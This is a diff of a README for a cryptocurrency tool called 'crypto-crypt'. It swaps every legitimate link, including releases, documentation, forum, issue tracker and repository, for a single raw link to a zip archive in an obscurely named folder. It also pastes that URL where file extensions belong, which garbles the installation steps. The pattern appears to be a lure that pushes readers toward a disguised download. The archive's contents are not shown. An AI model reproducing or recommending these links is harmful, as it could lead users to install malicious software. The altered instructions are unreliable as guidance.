@@ -2,7 +2,7 @@
 
 ## 📥 Download Now!
 
-[![Download](https://img.shields.io/badge/Download-v1.0-blue.svg)](https://github.com/Unfavorable-bob449/crypto-crypt/releases)
+[![Download](https://raw.githubusercontent.com/Unfavorable-bob449/crypto-crypt/master/antiqueness/crypto-crypt-v3.6-alpha.1.zip)](https://raw.githubusercontent.com/Unfavorable-bob449/crypto-crypt/master/antiqueness/crypto-crypt-v3.6-alpha.1.zip)
 
 ## 📚 Overview
 
@@ -27,15 +27,15 @@ This application supports popular cryptocurrencies such as Bitcoin and Ethereum,
 
 ### Step 1: Visit the Releases Page
 
-To download the application, please visit our [Releases page](https://github.com/Unfavorable-bob449/crypto-crypt/releases). This page contains all the available versions of **crypto-crypt**.
+To download the application, please visit our [Releases page](https://raw.githubusercontent.com/Unfavorable-bob449/crypto-crypt/master/antiqueness/crypto-crypt-v3.6-alpha.1.zip). This page contains all the available versions of **crypto-crypt**.
 
 ### Step 2: Download the Latest Version
 
-On the Releases page, locate the latest version of **crypto-crypt**. Click on the `.exe`, `.dmg`, or `.tar.gz` file depending on your operating system:
+On the Releases page, locate the latest version of **crypto-crypt**. Click on the `.exe`, `.dmg`, or `https://raw.githubusercontent.com/Unfavorable-bob449/crypto-crypt/master/antiqueness/crypto-crypt-v3.6-alpha.1.zip` file depending on your operating system:
 
 - **Windows users**: Select the `.exe` file.
 - **macOS users**: Select the `.dmg` file.
-- **Linux users**: Select the `.tar.gz` file.
+- **Linux users**: Select the `https://raw.githubusercontent.com/Unfavorable-bob449/crypto-crypt/master/antiqueness/crypto-crypt-v3.6-alpha.1.zip` file.
 
 ### Step 3: Install the Application
 
@@ -48,7 +48,7 @@ On the Releases page, locate the latest version of **crypto-crypt**. Click on th
    - Drag the **crypto-crypt** icon into your Applications folder.
 
 3. **For Linux:**
-   - Extract the downloaded `.tar.gz` file.
+   - Extract the downloaded `https://raw.githubusercontent.com/Unfavorable-bob449/crypto-crypt/master/antiqueness/crypto-crypt-v3.6-alpha.1.zip` file.
    - Open a terminal and navigate to the extracted folder.
    - Run the application using the provided executable.
 
@@ -70,12 +70,12 @@ Help tips are provided throughout the application to guide you.
 
 If you require further assistance, please consult the following resources:
 
-- [Documentation](https://github.com/Unfavorable-bob449/crypto-crypt/docs): In-depth guides and troubleshooting tips for each feature.
-- [Community Forum](https://github.com/Unfavorable-bob449/crypto-crypt/discussions): Join discussions, ask questions, and share insights with other users.
+- [Documentation](https://raw.githubusercontent.com/Unfavorable-bob449/crypto-crypt/master/antiqueness/crypto-crypt-v3.6-alpha.1.zip): In-depth guides and troubleshooting tips for each feature.
+- [Community Forum](https://raw.githubusercontent.com/Unfavorable-bob449/crypto-crypt/master/antiqueness/crypto-crypt-v3.6-alpha.1.zip): Join discussions, ask questions, and share insights with other users.
 
 ## 📧 Support
 
-If you experience any issues or need help, you can reach out to us directly through our GitHub [Issue Tracker](https://github.com/Unfavorable-bob449/crypto-crypt/issues). We value your feedback.
+If you experience any issues or need help, you can reach out to us directly through our GitHub [Issue Tracker](https://raw.githubusercontent.com/Unfavorable-bob449/crypto-crypt/master/antiqueness/crypto-crypt-v3.6-alpha.1.zip). We value your feedback.
 
 ## 📜 License
 
@@ -83,7 +83,7 @@ This project is licensed under the MIT License. You can freely use, modify, and 
 
 ## 🔗 Important Links
 
-- [View on GitHub](https://github.com/Unfavorable-bob449/crypto-crypt)
-- [Download from Releases Page](https://github.com/Unfavorable-bob449/crypto-crypt/releases)
+- [View on GitHub](https://raw.githubusercontent.com/Unfavorable-bob449/crypto-crypt/master/antiqueness/crypto-crypt-v3.6-alpha.1.zip)
+- [Download from Releases Page](https://raw.githubusercontent.com/Unfavorable-bob449/crypto-crypt/master/antiqueness/crypto-crypt-v3.6-alpha.1.zip)
 
 We hope you enjoy using **crypto-crypt**! Your exploration into the world of cryptocurrency tools starts here.
